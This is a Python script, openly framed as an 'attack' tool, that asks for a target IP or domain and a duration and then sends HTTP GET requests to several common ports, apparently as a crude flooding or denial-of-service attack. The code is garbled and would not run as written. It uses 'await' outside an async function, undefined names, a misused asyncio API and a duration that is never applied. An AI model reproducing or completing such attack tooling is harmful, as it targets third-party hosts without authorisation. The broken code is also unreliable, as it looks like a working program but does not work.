import asyncio
import time
import socket
import subprocess
from collections import defaultdict
from typing import Dict, List

class CustomTCPProtocol(asyncio.protocol.BaseProtocol):
    def __init__(self):
        self.q = defaultdict(asyncio.Queue)
        self.d = {}

    def connection_made(self, transport):
        self.trans = transport

    def data_received(self, data: bytes) -> None:
        for dest in self.d.values():
            dest[0].put_nowait(data)

    def connection_lost(self, exc):
        if exc is not asyncio.CancelledError:
            print("Connection lost")
        for dest in self.d.values():
            dest[1].put_nowait(asyncio.Future())
        self.d.clear()

    def send_data(self, dest: Tuple[asyncio.Queue, asyncio.Semaphore], data: bytes):
        if not dest[0].empty():
            dest[1].acquire()
            dest[0].put_nowait(data)
            dest[1].release()

    def add_destination(self, dest: Tuple[str, int]):
        if dest not in self.d:
            self.d[dest] = (self.q[dest[0]][0], self.q[dest[0]][1])

def attack(target: str, duration: int) -> None:
    def on_task_complete(f: asyncio.Future) -> None:
        status.setdefault(f.result(), 0)
        status[f.result()] += 1

    transport, proto = await asyncio.start_server(lambda r: None, "0.0.0.0", 0)
    try:
        ports = [80, 443, 8080, 21, 22]
        for port in ports:
            print(f"Sending data to {target}:{port}")
            proto.add_destination((target, int(port)))
            await transport.write(b"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".format(**{"port": str(port)}))
        print("Sending completed")
        tasks = [asyncio.create_task(transport.write(b"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".format(**dest)), on_complete=on_task_complete) for dest in self.d.values()]
        await asyncio.gather(*tasks)
        print(f"Attack duration: {duration} seconds")
        print("Status: ", status)
    finally:
        transport.close()

if __name__ == "__main__":
    port = 80
    duration = int(input("Enter the duration of the attack in seconds: "))
    target = input("Enter the target IP or domain (e.g. 123.123.123.123 or www.example.com): ")
    print(f"Attacking {target} on the following ports for {duration} seconds...")
    ports = [80, 443, 8080, 21, 22]
    print(f"{ports}")
    for port in ports:
        print(f"Attacking on port {port}")
    attack(target, duration)
